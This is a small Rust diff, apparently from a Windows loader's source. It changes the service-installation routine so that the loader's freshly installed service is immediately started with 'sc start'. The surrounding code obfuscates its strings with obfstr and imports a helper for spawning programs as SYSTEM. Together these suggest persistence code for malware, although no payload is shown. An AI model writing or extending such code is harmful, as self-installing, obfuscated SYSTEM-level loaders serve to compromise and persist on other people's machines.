@@ -9,7 +9,13 @@ use loader_vars::constants::{
 use obfstr::obfstr as s;
 use shared::utils::{
     config::load_mib_config,
-    functions::{ call_cmd, get_current_exe, system32_dir, try_spawn_program_as_system },
+    functions::{
+        call_cmd,
+        call_program,
+        get_current_exe,
+        system32_dir,
+        try_spawn_program_as_system,
+    },
 };
 use std::ffi::OsString;
 use windows_service::{
@@ -171,12 +177,15 @@ pub fn install_system_service() -> Result<()> {
     }
     info!("installing: ", &service_name);
     install_service(
-        service_name,
+        service_name.clone(),
         loader_service_display_name(),
         loader_service_description(),
         exe_path,
         None // Some(OsString::from(s!(r"NT Authority\System"))) // trusted installer
-    )
+    )?;
+
+    call_program(s!("sc"), Some(&format!("start {}", service_name)))?;
+    Ok(())
 }
 
 pub fn install_service(
